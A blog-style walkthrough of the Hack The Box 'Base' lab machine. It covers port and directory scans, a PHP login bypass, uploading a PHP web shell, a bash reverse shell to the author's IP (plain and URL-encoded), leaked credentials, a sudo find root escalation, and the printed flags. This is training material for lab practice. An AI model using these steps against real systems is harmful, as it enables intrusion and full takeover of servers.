---
title: "HTB Base"
date: 2023-05-30T16:32:14-07:00
draft: false
---

# Base by HTB - Starting Point 2 

IP=10.129.95.184
MyIP=10.10.15.79

## nmap 

### nmap -sCV -oN nmap-CV.txt $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f65c9b38eca75c791c1f181c5246f70b (RSA)
|   256 650cf7db42034607f21289fe11202c53 (ECDSA)
|_  256 b865cd3f34d8026ae318233e77dd8740 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome to Base
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
---

### nmap -p- -T5 $IP
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


from login dir 

<?php
session_start();
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }


intercept the login and chang

username=admin&password=admin
to
username[]=admin&password[]=admin

and we are logedin

make file to test upload

echo "<?php phpinfo(), ?>" > test.php

*note to self*: when uploading file don't forget to turn off the poxy or at lest see if it can be fowrded 

## Gobuster 
gobuster dir --url http://$IP/ --wordlist /usr/share/wordlists/dirb/big.txt 
2023/05/30 15:55:37 Starting gobuster in directory enumeration mode

/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/_uploaded            (Status: 301) [Size: 318] [--> http://10.129.95.184/_uploaded/]
/assets               (Status: 301) [Size: 315] [--> http://10.129.95.184/assets/]   
/forms                (Status: 301) [Size: 314] [--> http://10.129.95.184/forms/]    
/login                (Status: 301) [Size: 314] [--> http://10.129.95.184/login/]    
/server-status        (Status: 403) [Size: 278]                                      
2023/05/30 15:58:22 Finished
---

## To login

uplad file that has 
 `<?php echo system($_REQUEST['cmd']);?>`
 in file called webshell.php or other
 
 then go to /_uploaded and open the file in the broser and you should get a ?cmd=
 in the url I had to type it in but it worked once i did 
 then using burp intercept, change the request type to POST from GET then send to reptert and url encode /bin/bash -c 'bash -i >& /dev/tcp/&MyIP/PORT 0>&1'
 %2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%35%2e%37%39%2f%35%35%35%35%20%30%3e%26%31%27
--- 

 then set up your lisaner on the PORT 
 then you will get a rshell
 
 www-data@base:/var/www/html/_uploaded$ cat /var/www/html/login/config.php
cat /var/www/html/login/config.php
<?php
$username = "admin";
$password = "thisisagoodpassword";

ls /home
john

cant su 
so ssh john


##### user.txt
john@base:~$ cat user.txt 
f54846c258f3b4612f78a819573d158e

### Privilege Escalation
john@base:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on base:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on base:
    (root : root) /usr/bin/find

john@base:~$ sudo find . -exec /bin/sh \; -quit
\# whoami
root

found at [GTFOBins](https://gtfobins.github.io/gtfobins/find/)

# cat /root/root.txt
51709519ea18ab37dd6fc58096bea949

this is part of HTB startingpoint tire 2 
thank you 